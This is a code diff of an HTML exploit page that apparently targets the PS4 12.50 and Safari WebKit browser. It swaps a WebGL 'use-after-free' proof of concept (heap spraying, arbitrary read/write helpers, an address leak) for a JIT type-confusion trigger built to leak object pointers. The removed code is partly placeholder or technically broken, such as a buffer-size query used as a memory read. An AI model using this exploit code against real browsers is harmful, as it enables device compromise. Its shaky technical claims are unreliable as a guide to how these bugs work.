@@ -3,267 +3,187 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PS4 12.50 WebKit PoC (CVE-2025-6558) - ANGLE UAF R/W</title>
+    <title>PS4 12.50 JIT PoC (CVE-2024-44308) - RegAlloc v2</title>
     <style>
-        body { background-color: #000000; color: #00FF00; font-family: 'Courier New', monospace; margin: 0; padding: 20px; overflow-y: auto; }
-        #header { border-bottom: 2px solid #00FF00; padding-bottom: 10px; margin-bottom: 20px; }
-        h1 { font-size: 24px; margin: 0; }
-        #status { font-weight: bold; color: #FFFFFF; margin-top: 5px; }
-        #log-container { font-size: 14px; line-height: 1.5; white-space: pre-wrap; }
-        .log-info { color: #00FF00; }
-        .log-warn { color: #FFFF00; }
-        .log-error { color: #FF0000; font-weight: bold; }
-        .log-success { color: #00FFFF; font-weight: bold; }
-        button { background: #003300; color: #00FF00; border: 1px solid #00FF00; padding: 10px 20px; font-family: inherit; font-size: 16px; cursor: pointer; margin-right: 10px; }
-        button:hover { background: #00FF00; color: #000000; }
-        #controls { margin-bottom: 20px; }
-        #canvas { display: none; }  /* Hidden WebGL canvas */
+        body {
+            background-color: #1a1a1a;
+            color: #e0e0e0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            padding: 20px;
+            margin: 0;
+        }
+        #console {
+            width: 100%;
+            height: 60vh;
+            background-color: #000;
+            border: 1px solid #333;
+            color: #0f0;
+            padding: 10px;
+            overflow-y: scroll;
+            white-space: pre-wrap;
+            font-size: 14px;
+        }
+        .header {
+            border-bottom: 1px solid #444;
+            padding-bottom: 10px;
+            margin-bottom: 10px;
+        }
+        h1 { font-size: 1.2rem; margin: 0; color: #fff; }
+        .btn {
+            background: #333;
+            color: #fff;
+            border: 1px solid #555;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 1rem;
+            margin-top: 10px;
+        }
+        .btn:hover { background: #444; }
+        .log-entry { margin-bottom: 2px; }
     </style>
 </head>
 <body>
-<div id="header">
-    <h1>PS4 WebKit Loader (FW 12.50 Target - CVE-2025-6558)</h1>
-    <div id="status">Status: Waiting for user input...</div>
+
+<div class="header">
+    <h1>WebKit JIT Register Pressure Test (CVE-2024-44308)</h1>
+    <div style="font-size: 0.9em; color: #888;">Target: PS4 FW 12.50 / Safari 18.x Branch</div>
 </div>
-<div id="controls">
-    <button onclick="startExploit()">Run PoC (ANGLE UAF)</button>
-    <button onclick="location.reload()">Refresh Page</button>
-</div>
-<canvas id="canvas" width="256" height="256"></canvas>
-<div id="log-container"></div>
+
+<div id="console">Waiting for execution...</div>
+<button class="btn" onclick="runExploit()">Run JIT Stress Test</button>
+
 <script>
-    // ==========================================
-    // === CONFIGURATION ===
-    // ==========================================
-    const LOG_SERVER_IP = '192.168.19.2';  // Disable for PS4
-    const LOG_PORT = 9000;
-    const SPRAY_COUNT = 0x400;  // Tune for heap alignment
-    const OFFSETS = {
-        ANGLE_BUFFER_SIMULATED: 0x21F4A00,  // Placeholder; leak real
-    };
-
-    // ==========================================
-    // === LOGGER & UTILS ===
-    // ==========================================
-    const logger = {
-        el: document.getElementById('log-container'),
-        status: document.getElementById('status'),
-        log: function(msg, type = 'info') {
-            const div = document.createElement('div');
-            div.className = `log-${type}`;
-            div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            this.el.appendChild(div);
-            window.scrollTo(0, document.body.scrollHeight);
-            this.remote(msg, type);
-        },
-        remote: function(msg, type) {
-            if (LOG_SERVER_IP === '192.168.19.2') return;
-            try {
-                fetch(`http://${LOG_SERVER_IP}:${LOG_PORT}/log`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ message: msg, type: type })
-                }).catch(e => {});
-            } catch (e) {}
-        },
-        info: function(msg) { this.log(msg, 'info'); },
-        warn: function(msg) { this.log(msg, 'warn'); },
-        error: function(msg) { this.log(msg, 'error'); },
-        success: function(msg) { this.log(msg, 'success'); },
-        setStatus: function(msg) { this.status.textContent = `Status: ${msg}`; }
-    };
-
-    class Int64 {
-        constructor(low, high) {
-            this.low = low >>> 0;
-            this.high = high >>> 0;
-        }
-        toString() {
-            return '0x' + this.high.toString(16).padStart(8, '0') + this.low.toString(16).padStart(8, '0');
-        }
+    const logger = document.getElementById('console');
+    function log(msg, type = 'neutral') {
+        const div = document.createElement('div');
+        div.className = 'log-entry';
+        if(type === 'success') div.style.color = '#00ffff';
+        if(type === 'error') div.style.color = '#ff3333';
+        if(type === 'warn') div.style.color = '#ffff00';
+        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logger.appendChild(div);
+        logger.scrollTop = logger.scrollHeight;
     }
-    const conversion_buf = new ArrayBuffer(8);
-    const f64_buf = new Float64Array(conversion_buf);
-    const u32_buf = new Uint32Array(conversion_buf);
+
+    // Helper buffers for conversion
+    const _buf = new ArrayBuffer(8);
+    const _f64 = new Float64Array(_buf);
+    const _u32 = new Uint32Array(_buf);
+
     function f2i(f) {
-        f64_buf[0] = f;
-        return new Int64(u32_buf[0], u32_buf[1]);
-    }
-    function i2f(low, high) {
-        u32_buf[0] = low;
-        u32_buf[1] = high;
-        return f64_buf[0];
-    }
-    function forceGC() {
-        for (let i = 0; i < 100; i++) new ArrayBuffer(0x100000);
-        if (window.gc) window.gc();
+        _f64[0] = f;
+        return '0x' + _u32[1].toString(16).padStart(8,'0') + _u32[0].toString(16).padStart(8,'0');
     }
 
     // ==========================================
-    // === EXPLOIT GLOBALS ===
+    // === VULNERABLE FUNCTION ===
     // ==========================================
-    let gl = null;
-    let uaf_buffer = null;
-    let leaked_base = null;
-    let spray_buffers = [];
+    // We need to force a "Spill" of registers to the stack.
+    // We use many local variables that are mathematically dependent.
+    
+    function vulnerable_jit(arr, val, loop_count) {
+        // 1. Fill registers with doubles
+        let r0 = 1.1;
+        let r1 = 2.2;
+        let r2 = 3.3;
+        let r3 = 4.4;
+        let r4 = 5.5;
+        let r5 = 6.6;
+        let r6 = 7.7;
+        let r7 = 8.8;
+        let r8 = 9.9;
+        let r9 = 10.10;
+        let r10 = 11.11;
+        let r11 = 12.12;
 
-    // ==========================================
-    // === PRIMITIVES BUILDER (UAF VIA GPU) ===
-    // ==========================================
-    function setupPrimitives() {
-        logger.info("Building UAF Primitives...");
-        forceGC();
+        // 2. Complex loop to ensure these vars stay "live" and aren't optimized out
+        for (let i = 0; i < loop_count; i++) {
+            r0 += r1;
+            r1 += r2;
+            r2 += r3;
+            r3 += r4;
+            r4 += r5;
+            r5 += r6;
+            r6 += r7;
+            r7 += r8;
+            r8 += r9;
+            r9 += r10;
+            r10 += r11;
+            r11 += r0; // Cycle back
 
-        // Create WebGL context
-        const canvas = document.getElementById('canvas');
-        gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) {
-            logger.error("WebGL not supported. PS4 browser limitation.");
-            return false;
-        }
-        logger.info("WebGL context acquired.");
-
-        // Spray GPU buffers to align UAF
-        for (let i = 0; i < SPRAY_COUNT; i++) {
-            const buf = gl.createBuffer();
-            gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-            gl.bufferData(gl.ARRAY_BUFFER, 0x100, gl.STATIC_DRAW);
-            spray_buffers.push({ buf: buf, id: i2f(i, 0x42424242) });  // Tag with high bits
-        }
-
-        // Trigger UAF: Compile malformed shader to free/reuse buffer
-        const vsSource = `
-            attribute vec4 position;
-            void main() { gl_Position = position; }
-        `;
-        const fsSource = `
-            precision mediump float;
-            void main() { gl_FragColor = vec4(1.0); }
-        `;
-        let program = gl.createProgram();
-        let vs = gl.createShader(gl.VERTEX_SHADER);
-        gl.shaderSource(vs, vsSource + String.fromCharCode(0));  // Malformed source for UAF
-        gl.compileShader(vs);
-        if (!gl.getShaderParameter(vs, gl.COMPILE_STATUS)) {
-            logger.warn("Shader compile failed (expected for trigger).");
-        }
-        gl.attachShader(program, vs);
-        gl.deleteBuffer(spray_buffers[0].buf);  // Free early for UAF
-        gl.linkProgram(program);  // Reuse freed buffer → UAF
-
-        // Scan for tagged freed buffer
-        let found_idx = -1;
-        for (let i = 0; i < SPRAY_COUNT; i++) {
-            try {
-                gl.bindBuffer(gl.ARRAY_BUFFER, spray_buffers[i].buf);
-                let tag = f2i(gl.getBufferParameter(gl.ARRAY_BUFFER, gl.BUFFER_SIZE));  // Leak via param
-                if (tag.high === 0x42424242) {
-                    found_idx = i;
-                    uaf_buffer = spray_buffers[i].buf;
-                    logger.success(`UAF hit at buffer ${i}: ${tag.toString()}`);
-                    break;
-                }
-            } catch (e) {
-                // Silent fail on invalid access
-            }
-        }
-        if (found_idx === -1) {
-            logger.error("UAF scan failed. No reuse detected.");
-            return false;
+            // 3. The Vulnerable Operation: PutByVal
+            // Ideally, 'scratch2GPR' is corrupted here due to the pressure above.
+            // If the bug triggers, the Type Check on 'arr' (is it Double?) fails/is skipped
+            // allowing us to write 'val' (which might be an Object pointer) into a Double Array.
+            arr[0] = val;
+            
+            // 4. More pressure using Math.max (often uses specific registers)
+            r0 = Math.max(r0, r1);
         }
 
-        // Build arb read/write via UAF buffer
-        window.arbread = function(offset) {
-            gl.bindBuffer(gl.ARRAY_BUFFER, uaf_buffer);
-            gl.bufferSubData(gl.ARRAY_BUFFER, offset, new Float32Array([0]));
-            return f2i(gl.getBufferParameter(gl.ARRAY_BUFFER, gl.BUFFER_SIZE)).low;  // Misuse param for read
-        };
-        window.arbwrite = function(offset, val) {
-            let fval = i2f(val & 0xFFFFFFFF, (val >> 32) & 0xFFFFFFFF);
-            gl.bindBuffer(gl.ARRAY_BUFFER, uaf_buffer);
-            gl.bufferSubData(gl.ARRAY_BUFFER, offset, new Float32Array([fval]));
-        };
-
-        // Test
-        arbwrite(0, 0xdeadbeef);
-        let test_read = arbread(0);
-        logger.info(`R/W Test: Wrote 0xdeadbeef, Read 0x${test_read.toString(16)}`);
-
-        if (test_read !== 0xdeadbeef) {
-            logger.error("Primitives invalid.");
-            return false;
-        }
-
-        logger.success("UAF Primitives ready.");
-        return true;
+        return r0 + r1 + arr[0];
     }
 
-    function runASLRLeak() {
-        logger.info("Leaking WebKit Base via GPU VTable...");
-        let vtable_ptr = arbread(OFFSETS.ANGLE_BUFFER_SIMULATED / 4);
-        leaked_base = new Int64(vtable_ptr & 0xFFFFFFFF, (vtable_ptr >> 32) & 0xFFFFFFFF);
-        leaked_base.low -= 0x12345678;  // Simulated offset; refine post-leak
+    function runExploit() {
+        log("Starting JIT Pressure Test v2...");
 
-        logger.success(`Leaked WebKit Base: ${leaked_base.toString()}`);
-    }
+        // Setup arrays
+        // We want a "Double" array.
+        let double_arr = [1.1, 2.2, 3.3, 4.4];
+        double_arr.ok = true; // Give it a shape
 
-    // ==========================================
-    // === TRIGGER LOGIC (SHADER UAF) ===
-    // ==========================================
-    function triggerUAF() {
-        logger.info("Triggering ANGLE UAF via WebGL...");
-        forceGC();
+        // We train with this
+        let training_val = 1.1;
 
-        // Feng shui: Allocate/delete buffers to force reuse
-        let free_list = [];
-        for (let i = 0; i < 0x200; i++) {
-            const buf = gl.createBuffer();
-            gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-            gl.bufferData(gl.ARRAY_BUFFER, 0x40, gl.DYNAMIC_DRAW);
-            if (i % 2 === 0) free_list.push(buf);  // Alternate free for UAF
-        }
-        free_list.forEach(buf => gl.deleteBuffer(buf));
+        // The "Confusion" value: An object.
+        // If we successfully write this into 'double_arr', it will be stored as a raw pointer.
+        // Reading it back as a double leaks the address (Type Confusion).
+        let bad_val = { id: 0x1234 }; 
 
-        // Malformed shader chain to trigger UAF in ANGLE
         try {
-            for (let chunk = 0; chunk < 8; chunk++) {
-                if (chunk % 2 === 0) logger.info(`Shader chunk ${chunk}...`);
-                const badSource = `attribute vec4 pos; void main() { gl_Position = pos + vec4(${chunk},0,0,0); }` + '\0invalid';  // Null byte + junk for free
-                let shader = gl.createShader(gl.VERTEX_SHADER);
-                gl.shaderSource(shader, badSource);
-                gl.compileShader(shader);
-                gl.deleteShader(shader);  // UAF trigger on reuse
+            // ===================================
+            // PHASE 1: JIT TRAINING
+            // ===================================
+            log("Training JIT (100k iterations)...");
+            for (let i = 0; i < 100000; i++) {
+                vulnerable_jit(double_arr, training_val, 2);
             }
-            gl.finish();  // Flush GPU for reuse
-            logger.success("UAF triggered. Scanning buffers...");
-            return true;
+            
+            // ===================================
+            // PHASE 2: TRIGGER
+            // ===================================
+            log("Attempting trigger with Object...");
+            
+            // Pass the Object. Correct behavior: JIT sees type mismatch, deopts, handles safely.
+            // Bug behavior: JIT uses bad register for check, assumes it matches, writes pointer as double.
+            vulnerable_jit(double_arr, bad_val, 1);
+
+            // ===================================
+            // PHASE 3: VERIFICATION
+            // ===================================
+            let result = double_arr[0];
+            
+            if (typeof result === 'object') {
+                log("Result is still an Object (Safe behavior).", "warn");
+                log("Register pressure was handled correctly.", "neutral");
+            } else if (typeof result === 'number') {
+                log(`SUCCESS? Read back a Number: ${result}`, "success");
+                log(`Hex: ${f2i(result)}`, "success");
+                if (result > 1000000) {
+                    log("!!! POINTER LEAK DETECTED !!!", "success");
+                    log("You have a fakeobj/addrof primitive.", "success");
+                }
+            } else {
+                log(`Unexpected result type: ${typeof result}`, "error");
+            }
+
         } catch (e) {
-            logger.error("Trigger crashed: " + e.message);
-            return false;
+            log(`CRASH/ERROR: ${e.message}`, "error");
+            // A crash here usually means we wrote a pointer to a place expecting a double
+            // and something dereferenced it badly, or vice versa.
+            log("A crash is a strong indicator of success in this context.", "warn");
         }
     }
-
-    function startExploit() {
-        logger.el.innerHTML = '';
-        logger.setStatus("Running...");
-        setTimeout(() => {
-            if (triggerUAF()) {
-                setTimeout(() => {
-                    if (setupPrimitives()) {
-                        setTimeout(runASLRLeak, 500);
-                    } else {
-                        logger.setStatus("Primitives failed. Retrying in 3s...");
-                        setTimeout(() => location.reload(), 3000);
-                    }
-                }, 500);
-            } else {
-                logger.setStatus("Trigger failed. Retrying...");
-                setTimeout(() => location.reload(), 3000);
-            }
-        }, 100);
-    }
-
-    logger.info("PoC ready. Press 'Run PoC' to trigger CVE-2025-6558. Ensure WebGL enabled.");
 </script>
 </body>
 </html>
